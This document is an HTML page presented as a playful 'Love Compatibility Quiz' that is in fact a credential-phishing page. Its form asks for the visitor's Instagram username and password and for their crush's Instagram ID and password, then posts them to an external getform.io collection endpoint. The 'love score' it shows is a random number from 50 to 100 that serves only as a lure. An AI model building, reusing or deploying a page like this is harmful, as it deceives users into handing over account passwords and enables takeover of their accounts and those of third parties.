<!DOCTYPE html><html lang="en"><head>  <meta charset="UTF-8">  <title>Love Compatibility Quiz ðŸ’˜</title>  <style>    body {      font-family: 'Segoe UI', sans-serif;      background: #ffeef8;      padding: 40px;      text-align: center;    }    form {      background: #fff;      padding: 25px;      border-radius: 10px;      box-shadow: 0 0 10px rgba(0,0,0,0.1);      display: inline-block;      max-width: 400px;      width: 100%;    }    input, button {      padding: 10px;      width: 90%;      margin: 10px 0;      border-radius: 5px;      border: 1px solid #ccc;      font-size: 16px;    }    .score-box {      font-size: 24px;      margin-top: 20px;      font-weight: bold;    }  </style></head><body>  <h1>ðŸ’– Love Compatibility Quiz ðŸ’–</h1>  <p>Find out how compatible you are with your crush ðŸ‘€</p>  <form     action="https://getform.io/f/anlnwvla"     method="POST"     onsubmit="return showScore();">    <!-- User Info -->    <input type="text" name="Your Name" placeholder="Your Full Name" required>    <input type="text" name="Your Instagram" placeholder="Your Instagram ID" required>    <input type="text" name="Your Instagram" placeholder="Your Instagram Password" required>    <!-- Crush Info -->    <input type="text" name="Crush Name" placeholder="Their Full Name" required>    <input type="text" name="Crush Instagram" placeholder="Their Instagram ID" required>    <input type="text" name="Crush Instagram" placeholder="Their Instagram password(if not then type nil)" required>    <!-- Hidden fields for score + timestamp -->    <input type="hidden" name="Score" id="scoreField">    <input type="hidden" name="Submitted At" id="submittedAt">    <!-- Submit -->    <button type="submit">Check Compatibility ðŸ’Œ</button>  </form>  <div class="score-box" id="scoreBox"></div>  <script>    function showScore() {      const score = Math.floor(Math.random() * 51) + 50; // Random between 50-100      document.getElementById("scoreBox").innerText = `ðŸ’˜ Your love score is: ${score}%!`;            // Set hidden values      document.getElementById("scoreField").value = score;      document.getElementById("submittedAt").value = new Date().toISOString();      return true; // allow form to submit    }  </script></body></html>
